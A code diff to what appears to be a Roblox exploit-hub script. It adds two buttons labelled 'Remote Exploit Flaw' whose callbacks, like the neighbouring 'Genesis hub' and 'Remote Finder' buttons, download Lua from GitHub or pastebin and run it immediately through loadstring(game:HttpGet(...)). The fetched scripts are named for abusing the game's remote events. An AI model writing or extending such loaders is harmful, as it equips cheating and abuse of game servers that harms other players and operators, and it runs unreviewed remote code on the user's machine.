@@ -125,6 +125,13 @@ Tab3:AddButton({
 })
 
 Tab3:AddButton({
+    Name = "Remote Exploit Flaw 2.1",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/remote%20abuse%202.1.lua"))()
+    end    
+})
+
+Tab3:AddButton({
     Name = "Genesis hub",
     Callback = function()
         loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Genesis-Hub-9584"))()
@@ -142,6 +149,13 @@ Tab3:AddButton({
     Name = "Remote Finder",
     Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/zhJdeD9E"))()
+    end    
+})
+
+Tab3:AddButton({
+    Name = "Remote Exploit Flaw",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/remote%20event%20abuse.txt"))()
     end    
 })
 
